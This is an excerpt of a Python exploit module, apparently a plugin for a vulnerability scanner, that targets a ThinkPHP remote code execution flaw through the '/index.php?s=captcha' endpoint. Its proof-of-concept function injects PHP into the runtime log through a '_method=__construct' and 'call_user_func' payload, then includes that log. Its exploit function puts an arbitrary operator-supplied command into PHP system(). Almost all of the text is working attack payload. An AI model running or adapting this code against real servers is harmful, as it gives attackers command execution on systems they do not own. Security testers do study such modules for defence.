...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        # rp = requests.get(url + "/?m=Home&c=Index&a=index&test=--><?=var_dump('xiaohei');?>",headers=heads)
        req = urllib.request.Request(url+"/index.php?s=captcha",data="_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=<?php var_dump('xiaohei')?>".encode("utf-8"),headers=heads)
        urllib.request.urlopen(req,context=context)
        rp = requests.post(url+"/index.php?s=captcha",headers=heads,data="_method=__construct&method=get&filter[]=think__include_file&server[]=phpinfo&get[]=../runtime/log/"+data+".log",verify=False,timeout=10)
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='cmd':
            ...
            context = ssl._create_unverified_context()
            # rp = requests.get(url + "/?m=Home&c=Index&a=index&test=--><?=var_dump('xiaohei');?>",headers=heads)
            str = "_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=<?php system("+exp_data['command']+")?>"
            req = urllib.request.Request(url+"/index.php?s=captcha",data=str.encode("utf-8"),headers=heads)
            urllib.request.urlopen(req,context=context)
            rp = requests.post(url+"/index.php?s=captcha",headers=heads,data="_method=__construct&method=get&filter[]=think__include_file&server[]=phpinfo&get[]=../runtime/log/"+data+".log",verify=False,timeout=10)
            if rp.text!="":
                result['Result'] = True
